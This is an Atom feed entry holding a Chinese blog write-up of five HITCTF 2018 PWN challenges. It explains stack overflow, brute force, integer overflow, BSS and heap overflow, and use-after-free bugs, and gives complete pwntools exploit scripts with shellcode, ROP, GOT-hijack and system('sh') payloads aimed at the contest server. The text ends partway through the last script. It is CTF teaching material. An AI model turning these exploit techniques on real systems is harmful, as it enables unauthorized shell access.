<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>p4nda | PWN &amp; security</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://p4nda.top/"/>
  <updated>2018-02-02T17:05:49.945Z</updated>
  <id>http://p4nda.top/</id>
  
  <author>
    <name>P4NDA</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>HITCTF 2018 PWN 题记录</title>
    <link href="http://p4nda.top/2018/02/05/hitctf/"/>
    <id>http://p4nda.top/2018/02/05/hitctf/</id>
    <published>2018-02-04T16:34:14.000Z</published>
    <updated>2018-02-02T17:05:49.945Z</updated>
    
    <content type="html"><![CDATA[<p>HITCTF是哈尔滨工业大学组织的一场校赛，在假期时间看了一下题目，锻炼一下，以此记录。</p><p><img src="/img/HITCTF/logo.png" alt=""></p><p>本次比赛共有五道PWN题：</p><ul><li>stackoverflow （栈溢出）</li><li>login（爆破）</li><li>DragonBall（整数溢出）</li><li>nodes（溢出BSS段，影响程序逻辑）</li><li>babynote（UAF）</li></ul><hr><h1 id="stackoverflow"><a href="#stackoverflow" class="headerlink" title="stackoverflow"></a>stackoverflow</h1><p>此题目是PWN题的签到题，函数逻辑简单，在主函数调用的vuln函数中存在明显的栈溢出漏洞</p><p><img src="/img/HITCTF/pwn_1_1.png" alt=""></p><p>可以溢出覆盖0x18个字节，并且没有开启canary保护， 可以利用ROP技术控制执行流</p><p><img src="/img/HITCTF/pwn_1_3.png" alt=""></p><p>如程序中存在一个flag函数，可以直接获取flag</p><p><img src="/img/HITCTF/pwn_1_2.png" alt=""></p><p>exp.py脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">debug =<span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">'./stackoverflow'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p = process(<span class="string">'./stackoverflow'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">'111.230.132.82'</span>,<span class="number">40000</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Welcome to pwn world!\nLeave your name:'</span>)</span><br><span class="line">p.send(<span class="string">'a'</span>*<span class="number">0x28</span>+p32(<span class="number">0xdeadbeef</span>)+p32(<span class="number">0x80485df</span>)+p32(<span class="number">0xdeadbeef</span>)+p32(<span class="number">0xdeadbeef</span>)+p32(<span class="number">0xc0ffee</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><hr><h1 id="login"><a href="#login" class="headerlink" title="login"></a>login</h1><p>此题的整体代码逻辑很清晰，首先登录一次，然后再过一次check，就可以直接得到flag</p><p><img src="/img/HITCTF/pwn_2_1.png" alt=""></p><p>对比两个用户名密码的check函数可以发现其中的不同：</p><p><img src="/img/HITCTF/pwn_2_2.png" alt=""></p><p><img src="/img/HITCTF/pwn_2_3.png" alt=""></p><p>很明显发现其不同点在于strncmp的参数上，第一个函数参数长度是用户输入的长度，第二次是固定的长度。此时可以发现两个hint。</p><ol><li>password的长度是0x20（抖机灵）</li><li>由于password是固定的，因此可以通过爆破的方法来验证，每次爆破一位不断叠加，即可得到其真实密码。</li></ol><p>爆破的脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">10_adhUNwj_qidACn_qdXon912_uhdq6</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">'./login'</span>)</span><br><span class="line">    <span class="comment">#libc = ELF('./libc.local.so')</span></span><br><span class="line">    <span class="comment">#off = 0x001b2000</span></span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'111.230.132.82'</span>, <span class="number">40001</span>)</span><br><span class="line">    <span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">    <span class="comment">#libc = ELF('./libc_32.so.6')</span></span><br><span class="line">password = <span class="string">''</span></span><br><span class="line">dic = range(<span class="number">33</span>,<span class="number">127</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(j)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> password</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'password'</span> + chr(j)</span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        p = process(<span class="string">'./login'</span>)</span><br><span class="line">        context.log_level = <span class="string">'debug'</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = remote(<span class="string">'111.230.132.82'</span>, <span class="number">40001</span>)</span><br><span class="line">        <span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">    p.recvuntil(<span class="string">'Username:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'root'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Password: '</span>)</span><br><span class="line">    p.sendline(password+chr(j))</span><br><span class="line">    a = p.recvline()</span><br><span class="line">    <span class="keyword">print</span> a </span><br><span class="line">    <span class="keyword">if</span> <span class="string">'successful'</span> <span class="keyword">in</span> a:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">return</span> chr(j)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'00'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">boom</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> password</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">0x20</span>):</span><br><span class="line">        pro = log.progress(<span class="string">'go'</span>)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">            pro.status(<span class="string">'boom for '</span>+chr(j))</span><br><span class="line">            <span class="comment">#tmp = ''</span></span><br><span class="line">            tmp = login(j)</span><br><span class="line">            <span class="comment">#print tmp</span></span><br><span class="line">            <span class="keyword">if</span> tmp!=<span class="string">'00'</span>:</span><br><span class="line">                password = password + tmp</span><br><span class="line">                pro.success(<span class="string">': is '</span>+password)</span><br><span class="line">                <span class="keyword">print</span> <span class="string">'password is '</span>,password</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">password = <span class="string">''</span></span><br><span class="line">boom()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><hr><h1 id="DragonBall"><a href="#DragonBall" class="headerlink" title="DragonBall"></a>DragonBall</h1><p>程序大意是 手中共有15个金币， 购买一个龙珠需要5金币，出售一个龙珠3金币，当集齐7颗龙珠以后就能实现愿望了（wish()）。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>wish()函数中有明显的溢出漏洞，但是很不充分，溢出仅能覆盖返回地址和EBP，如果单纯写rop很难，除非有很好的跳板，但是并没有发现jmp xxx的跳板，一度陷入僵局…</p><p><img src="/img/HITCTF/pwn_3_1.png" alt=""></p><p>突然想起查了一下保护开启情况，发现没有开NX保护，也就是说可以执行shellcode…</p><p><img src="/img/HITCTF/pwn_3_2.png" alt=""></p><p>就是说可以在第一块内写入execve(‘/bin/sh’)的shellcode，然后覆盖返回地址去执行，仅需知道该处的地址即可，需要泄露栈地址，此处可以从第一处写入部分去泄露，泄露wish()的ebp地址，即可得到shellcode起始位置的地址了。</p><h2 id="整数溢出"><a href="#整数溢出" class="headerlink" title="整数溢出"></a>整数溢出</h2><p>漏洞在于buy()中，仅检测是否money!=0的情况，也就是说构造一个money不为5的倍数即可无限制购买，很显然可以先买一个再卖出，就剩余13个金币，无论如何都不可能为0，因此可以无限制购买龙珠，最后达成愿望。</p><p><img src="/img/HITCTF/pwn_3_3.png" alt=""></p><p>最终，利用脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">'./DragonBall'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p = process(<span class="string">'./DragonBall'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">'111.230.132.82'</span>, <span class="number">40002</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'You choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'You choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">p.recvuntil(<span class="string">'You choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'You choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Tell me your wish: '</span>)</span><br><span class="line">payload = asm(shellcraft.sh())</span><br><span class="line">payload = payload.ljust(<span class="number">0x66</span>,<span class="string">'a'</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload+<span class="string">'b'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'ab'</span>)</span><br><span class="line">stack_leak = u32(p.recv(<span class="number">5</span>)[<span class="number">1</span>:])</span><br><span class="line"><span class="keyword">print</span> <span class="string">'stack_leak : '</span>,hex(stack_leak)</span><br><span class="line">offset = <span class="number">0xffa7cc48</span><span class="number">-0xffa7cbc0</span></span><br><span class="line">payload_addr = stack_leak - offset</span><br><span class="line"><span class="keyword">print</span> <span class="string">'shellcode : '</span>,hex(payload_addr)</span><br><span class="line">p.recvuntil(<span class="string">'is it right?\n(Y/N) '</span>)</span><br><span class="line">p.sendline(<span class="string">'a'</span>*<span class="number">0x38</span>+p32(stack_leak)+p32(payload_addr))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><hr><h1 id="notes"><a href="#notes" class="headerlink" title="notes"></a>notes</h1><p>程序的大概内容是程序维护这一个链表，链表各块使用malloc分配，大小为0x38（56）个字节，最开始四字节是一个unsigned int，命名为value，相当于一个索引，之后的48个字节为data，最后四字节为下一个块的地址。</p><p>程序利用value值遍历这个链表，找到这个链表的第一个value相同的项进行修改。</p><p>在这期间没有任何溢出问题。</p><h2 id="漏洞位置"><a href="#漏洞位置" class="headerlink" title="漏洞位置"></a>漏洞位置</h2><p>漏洞出现的原因有2点</p><ol><li>程序利用bss段上的某一个值对data长度进行限定,初始值为48</li><li>程序输出是先用sprintf函数拷贝到bss段上某一个位置，在用puts进行打印，而由于该缓存字符串的长度限定有问题，在建立了100个字节以上的节点时，会出现溢出现象，而溢出的点恰好为1中提到的data长度，将其覆盖成为字符’s’，也就是115，进一步造成了堆溢出。</li></ol><p><img src="/img/HITCTF/pwn_4_1.png" alt=""></p><p><img src="/img/HITCTF/pwn_4_2.png" alt=""></p><h2 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>漏洞利用思路是首先构造100个节点，造成堆溢出，此时可以的输入可以覆盖到下一块的地址部分，也就是说可以劫持链表，利用程序功能造成内存任意读写。</p><ol><li>首先将某数据库的下一块地址覆盖为puts@got地址，这样利用打印功能可以泄露libc的puts函数地址。</li><li>再对该块进行写操作，利用的索引即是泄露的puts地址，因为该块已经在链表中了，将该块地址覆写为一个one_gadget地址，最终利用puts函数的调用触发，即劫持got表。</li></ol><p>利用脚本如下：（io貌似还有点问题没有解决）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">'./nodes'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">'./nodes'</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'111.230.132.82'</span>, <span class="number">40003</span>)</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(value,data)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'please input your choice:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Value:'</span>)</span><br><span class="line">    p.send(str(value)+<span class="string">'\0'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Data:'</span>)</span><br><span class="line">    p.sendline(<span class="string">''</span>)</span><br><span class="line">    <span class="comment">#time.sleep()</span></span><br><span class="line">    p.recvuntil(<span class="string">'nodes\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#def change</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">103</span>):</span><br><span class="line">    add(i,<span class="string">'a'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'please input your choice:'</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'please input your choice:'</span>)</span><br><span class="line">p.sendline(<span class="string">'2\0'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Node\'s value:'</span>)</span><br><span class="line">p.sendline(<span class="string">'101'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'New value:'</span>)</span><br><span class="line">p.sendline(<span class="string">'101'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'New data:'</span>)</span><br><span class="line">p.sendline(<span class="string">'a'</span>*<span class="number">48</span>+p32(elf.got[<span class="string">'puts'</span>]))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'please input your choice:'</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Value:101\n'</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">a = p.recvline()</span><br><span class="line">puts_addr = int(a[<span class="number">6</span>:<span class="number">-1</span>],<span class="number">10</span>)</span><br><span class="line">libc.address = puts_addr - libc.symbols[<span class="string">'puts'</span>] </span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+]puts addr:'</span>,hex(puts_addr)</span><br><span class="line">p.recvuntil(<span class="string">'please input your choice:'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Node\'s value:'</span>)</span><br><span class="line">p.sendline(a[<span class="number">6</span>:<span class="number">-1</span>])</span><br><span class="line">p.recvuntil(<span class="string">'New value:'</span>)</span><br><span class="line">p.sendline(str(libc.address+<span class="number">0x3ac5c</span>))</span><br><span class="line">p.recvuntil(<span class="string">'New data:'</span>)</span><br><span class="line">p.sendline(<span class="string">''</span>)</span><br><span class="line">p.recvuntil(<span class="string">'choice:'</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">0x3ac5c execve("/bin/sh", esp+0x28, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  esi is the GOT address of libc</span></span><br><span class="line"><span class="string">  [esp+0x28] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x3ac5e execve("/bin/sh", esp+0x2c, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  esi is the GOT address of libc</span></span><br><span class="line"><span class="string">  [esp+0x2c] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x3ac62 execve("/bin/sh", esp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  esi is the GOT address of libc</span></span><br><span class="line"><span class="string">  [esp+0x30] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x3ac69 execve("/bin/sh", esp+0x34, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  esi is the GOT address of libc</span></span><br><span class="line"><span class="string">  [esp+0x34] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x5fbc5 execl("/bin/sh", eax)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  esi is the GOT address of libc</span></span><br><span class="line"><span class="string">  eax == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x5fbc6 execl("/bin/sh", [esp])</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  esi is the GOT address of libc</span></span><br><span class="line"><span class="string">  [esp] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><h1 id="babynote"><a href="#babynote" class="headerlink" title="babynote"></a>babynote</h1><p>一道比较典型的UAF漏洞。</p><h2 id="逻辑分析"><a href="#逻辑分析" class="headerlink" title="逻辑分析"></a>逻辑分析</h2><p>程序逻辑是一个可以任意输入的note，每一个note分为了两部分：block和content</p><p>block的结构为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|  size（int）    |      content address    |    function ptr    | </span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure><p>content的大小为size值</p><p>add函数中详细的为每一个变量赋值，尤其是function ptr，初始值为某自实现的puts函数</p><p><img src="/img/HITCTF/pwn_5_2.png" alt=""></p><p>print函数中显示了调用function ptr函数的参数和方法，可以想到如果可以劫持function ptr就可以执行任意命令</p><p><img src="/img/HITCTF/pwn_5_3.png" alt=""></p><p>在程序中要求最多可以生成3个note，分别存储在bss段上的一个数组内</p><p><img src="/img/HITCTF/pwn_5_1.png" alt=""></p><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>显然，由于在edit的时候并没有检查堆块是否已经被释放，因此，存在明显的UAF(Use After Free)漏洞。</p><p>而且删除堆块时程序的释放顺序是先释放content，再释放block，由于fastbin的LIFO性质，可以明显知道</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add（0xc，&apos;p4nda&apos;）</span><br><span class="line">delete(0)</span><br><span class="line">add(0xc,&apos;p4nda&apos;)</span><br></pre></td></tr></table></figure><p>使用的堆块是不变的，因此想要用分配得到的content控制一个note的block，进而控制function ptr的方法必须让堆块分配不平衡。</p><p>比如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">add(0x100,&apos;p4nda&apos;)</span><br><span class="line">add(0xc,&apos;p4nda&apos;)</span><br><span class="line">delete(1)</span><br><span class="line">delete(0)</span><br><span class="line">add(0xc,payload)</span><br></pre></td></tr></table></figure><p>这样分配，可以导致第0个note的block分配给第2个note的block，而第1个note的block会分配给第二个note作为content，是可以编辑的，进一步可以劫持控制流。</p><h2 id="地址泄露"><a href="#地址泄露" class="headerlink" title="地址泄露"></a>地址泄露</h2><p>此题开启了PIE保护，不可以使用题目文件中的固定地址了。同时需要利用获取system地址，来得到shell，因此泄露一个libc地址是很必要的。</p><p>这时存在一个堆块分配与释放的机制问题，堆块在libc的内存管理中主要分fastbin、unsorted bin、 small bin、large bin、top、mmap来管理，其中fastbin管理的是较小堆块，当内存小于global_max_fast值时，在内存释放时会挂载到fastbin中，而稍大一些的small bin、large bin在释放时，当不与top头相邻，会先挂载到unsorted bin中去。</p><p>而如何寻找到各个bin的地址？libc在bss段上设置了一个结构体变量叫 main_arena，变量的各个成员就是每个bin的开头，如图</p><p><img src="/img/HITCTF/pwn_5_5.png" alt=""></p><p>在libc符号表中，没有main<em>arena的符号，但该地址与\</em>_malloc<em>hook很近，通常利用 \</em>_mall_hook来定位main_arena</p><p><img src="/img/HITCTF/pwn_5_6.png" alt=""></p><p>在各个bin链表中，不同的链表有不同的组织方式，如fastbin是单链表，unsorted bin、small bin是双链表，largebin更为复杂。因此，常用的地址泄露的方式是从unsorted bin泄露，当可以任意读取unsorted bin数据时，堆块的fd位置即为main_arena中unsorted bin地址。</p><p>如在此题中就可以用这种方式泄露</p><p><img src="/img/HITCTF/pwn_5_7.png" alt=""></p><h2 id="劫持控制流"><a href="#劫持控制流" class="headerlink" title="劫持控制流"></a>劫持控制流</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">add(0x100,&apos;p4nda&apos;)</span><br><span class="line">add(0xc,&apos;p4nda&apos;)</span><br><span class="line">delete(1)</span><br><span class="line">delete(0)</span><br><span class="line">add(0xc,payload)</span><br></pre></td></tr></table></figure><p>当按上述方法控制了第1块的block时，修改payload即可完成对控制流的劫持，如利用泄露的libc地址获取system()地址，将其覆盖到function ptr时，在将size覆盖成 sh\x00\x00，利用print(1)进行触发即可获得一个shell</p><pre><code>+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+| &apos;sh\0\0&apos;    |     anything     |    system address    | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</code></pre><p>利用脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">'./babynote'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p = process(<span class="string">'./babynote'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">'111.230.132.82'</span>, <span class="number">40004</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span 